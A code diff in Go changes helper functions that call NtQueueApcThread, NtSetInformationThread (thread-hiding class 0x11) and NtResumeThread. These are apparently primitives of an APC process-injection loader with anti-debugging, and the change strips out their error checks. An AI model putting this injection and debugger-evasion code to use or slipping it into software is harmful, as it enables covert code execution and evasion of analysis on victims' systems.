@@ -109,18 +109,13 @@ func QueueApcThread(ntdll syscall.Handle, thandle uintptr, funcaddr uintptr) err
 	if err != nil {
 		return err
 	}
-	r, _, err := syscall.SyscallN(uintptr(NtQueueApcThread),
-		5,
+	syscall.SyscallN(uintptr(NtQueueApcThread),
 		thandle,  // IN HANDLE               ThreadHandle,
 		funcaddr, // IN PIO_APC_ROUTINE      ApcRoutine, (RemoteSectionBaseAddr)
 		0,        // IN PVOID                ApcRoutineContext OPTIONAL,
 		0,        // IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
 		0,        // IN ULONG                ApcReserved OPTIONAL
 		0)
-	if r != 0 {
-		log.Printf("NtQueueApcThread ERROR CODE: %x", r)
-		return err
-	}
 	return nil
 }
 
@@ -132,18 +127,13 @@ func SetInformationThread(ntdll syscall.Handle, thandle uintptr) error {
 		return err
 	}
 	ti := int32(0x11)
-	r, _, err := syscall.SyscallN(uintptr(NtSetInformationThread),
-		4,
+	syscall.SyscallN(uintptr(NtSetInformationThread),
 		thandle,     // 	HANDLE          ThreadHandle,
 		uintptr(ti), //   THREADINFOCLASS ThreadInformationClass,
 		0,           //   PVOID           ThreadInformation,
 		0,           //   ULONG           ThreadInformationLength
 		0,
 		0)
-	if r != 0 {
-		log.Printf("NtSetInformationThread ERROR CODE: %x", r)
-		return err
-	}
 
 	return nil
 }
@@ -154,15 +144,11 @@ func ResumeThread(ntdll syscall.Handle, thandle uintptr) error {
 	if err != nil {
 		return err
 	}
-	r, _, err := syscall.SyscallN(uintptr(NtResumeThread),
-		2,
+	syscall.SyscallN(uintptr(NtResumeThread),
 		thandle, // 	IN HANDLE               ThreadHandle,
 		0,       //   OUT PULONG              SuspendCount OPTIONAL
 		0)
-	if r != 0 {
-		log.Printf("NtResumeThread ERROR CODE: %x", r)
-		return err
-	}
+
 	return nil
 }
 
